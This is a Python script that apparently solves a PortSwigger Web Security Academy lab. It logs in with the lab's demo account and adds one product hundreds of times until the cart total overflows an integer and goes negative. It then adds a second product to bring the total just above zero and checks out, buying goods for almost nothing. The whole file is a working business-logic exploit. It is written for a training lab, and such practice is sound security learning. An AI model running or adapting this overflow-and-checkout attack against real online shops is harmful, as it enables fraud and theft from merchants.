import requests
from bs4 import BeautifulSoup

url = "https://0a4c00f704a353fd80bcdff2005500c4.web-security-academy.net/"
session = requests.Session()

def get_csrf_token(path):
    r = session.get(url + path)
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find(attrs={"name": "csrf"}).get("value")

def get_total_price():
    r = session.get(url + "cart")
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find_all("th")[5].get_text()

# Log In
data = {"csrf": get_csrf_token("login"), "username": "wiener", "password": "peter"}
r = session.post(url + "login", data=data)

# Overflow total price
data = {"productId": "1", "redir": "PRODUCT", "quantity": "99"}
counter = 1
while True:
    session.post(url + "cart", data=data)
    if counter == 324:
        break
    counter +=1
data = {"productId": "1", "redir": "PRODUCT", "quantity": "47"}
r = session.post(url + "cart", data=data)
print(get_total_price())

# Make total price positive
data = {"productId": "2", "redir": "PRODUCT", "quantity": "44"}
r = session.post(url + "cart", data=data)
print(get_total_price())

# Checkout
data = {"csrf": get_csrf_token("cart")}
session.post(url + "cart/checkout", data=data)
